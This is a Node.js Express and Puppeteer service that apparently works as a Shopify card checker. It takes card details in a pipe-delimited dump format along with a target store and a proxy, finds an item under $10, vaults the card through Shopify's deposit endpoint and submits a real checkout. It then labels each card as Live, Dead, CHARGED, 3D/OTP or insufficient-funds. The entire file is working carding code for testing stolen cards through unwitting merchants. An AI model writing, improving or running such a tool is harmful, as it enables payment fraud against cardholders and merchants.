const express = require('express');
const puppeteer = require('puppeteer');
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    res.send({ status: "Shopify Headless Browser Engine Active" });
});

app.post('/api/charge', async (req, res) => {
    const { card, site, proxy } = req.body;

    if (!card || !site) {
        return res.json({ status: "Dead", message: "MISSING_DATA", gateway: "Shopify Payments", price: "-", site: site || "N/A" });
    }

    const cleanSite = site.replace(/\/$/, '');
    const [ccNo, expMonth, expYear, cvv] = card.split('|');

    let browser = null;
    try {
        const launchOptions = {
            headless: 'new',
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        };

        if (proxy) {
            launchOptions.args.push(`--proxy-server=${proxy.trim()}`);
        }

        browser = await puppeteer.launch(launchOptions);
        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        // 1. Fetch products JSON to find a valid item under $10
        const prodRes = await page.goto(`${cleanSite}/products.json?limit=20`, { waitUntil: 'networkidle2', timeout: 15000 });
        const prodData = await prodRes.json();
        
        let selectedVariantId = null;
        let selectedPrice = 5.00;

        if (prodData && prodData.products) {
            for (const prod of prodData.products) {
                for (const v of prod.variants) {
                    const p = parseFloat(v.price);
                    if (p > 0 && p <= 10.00 && v.available) {
                        selectedVariantId = v.id;
                        selectedPrice = p;
                        break;
                    }
                }
                if (selectedVariantId) break;
            }
        }

        if (!selectedVariantId) {
            await browser.close();
            return res.json({ status: "Dead", message: "NO_PRODUCT_UNDER_10", gateway: "Shopify Payments", price: ">$10", site: cleanSite });
        }

        const formattedPrice = `$${selectedPrice.toFixed(2)}`;

        // 2. Add product to cart and go to checkout inside the browser instance
        await page.goto(`${cleanSite}/cart/add?id=${selectedVariantId}&quantity=1`, { waitUntil: 'networkidle2', timeout: 15000 });
        await page.goto(`${cleanSite}/checkout`, { waitUntil: 'networkidle2', timeout: 20000 });

        // 3. Vault card via Shopify Deposit API using browser page execution context
        const vaultResult = await page.evaluate(async (ccNo, expMonth, expYear, cvv) => {
            try {
                const response = await fetch('https://elb.deposit.shopifycs.com/sessions', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify({
                        credit_card: { number: ccNo, month: expMonth, year: expYear, name: "Valued Customer", verification_value: cvv }
                    })
                });
                return await response.json();
            } catch (e) {
                return { error: e.message };
            }
        }, ccNo, expMonth, expYear, cvv);

        if (!vaultResult || !vaultResult.id) {
            await browser.close();
            return res.json({ status: "Dead", message: "CARD_VAULT_DECLINED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        // 4. Submit checkout payload to test real payment gateway transaction
        const paymentResponse = await page.evaluate(async (vaultId) => {
            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
                    body: JSON.stringify({
                        step: 'payment',
                        s: vaultId,
                        checkout: { credit_card: { vault_id: vaultId } }
                    })
                });
                const text = await res.text();
                return { url: res.url, text: text };
            } catch (e) {
                return { error: e.message };
            }
        }, vaultResult.id);

        await browser.close();

        if (paymentResponse.error) {
            return res.json({ status: "Dead", message: paymentResponse.error, gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        const respText = paymentResponse.text.toLowerCase();
        const finalUrl = paymentResponse.url;

        let authenticError = "DECLINED_BY_PROCESSOR";
        if (paymentResponse.text.includes('notice__content') || paymentResponse.text.includes('error-message')) {
            const match = paymentResponse.text.match(/class="notice__content"[^>]*>([\s\S]*?)<\/p>/i);
            if (match && match[1]) {
                authenticError = match[1].replace(/<[^>]*>?/gm, '').trim();
            }
        }

        const isRealSuccess = (finalUrl.includes('thank_you') || paymentResponse.text.includes('thank_you')) && 
                              (paymentResponse.text.includes('order_number') || paymentResponse.text.includes('checkout_token'));

        if (isRealSuccess) {
            return res.json({ status: "CHARGED", message: "ORDER_PLACED_SUCCESSFULLY", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (respText.includes('insufficient_funds') || respText.includes('insufficient funds')) {
            return res.json({ status: "CVV Live/Insufficient", message: "INSUFFICIENT_FUNDS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (respText.includes('three_d_secure') || respText.includes('challenge') || respText.includes('3d secure')) {
            return res.json({ status: "3D/OTP", message: "CHALLENGE_REQUIRED_3DS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (respText.includes('incorrect_cvc') || respText.includes('security code')) {
            return res.json({ status: "CVV Live/Insufficient", message: "CCN_LIVE_INCORRECT_CVC", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else {
            return res.json({ status: "Dead", message: authenticError, gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

    } catch (err) {
        if (browser) await browser.close();
        return res.json({ status: "Dead", message: `BROWSER_TIMEOUT_${err.message}`, gateway: "Shopify Payments", price: "-", site: site || "N/A" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Headless Browser API running on port ${PORT}`));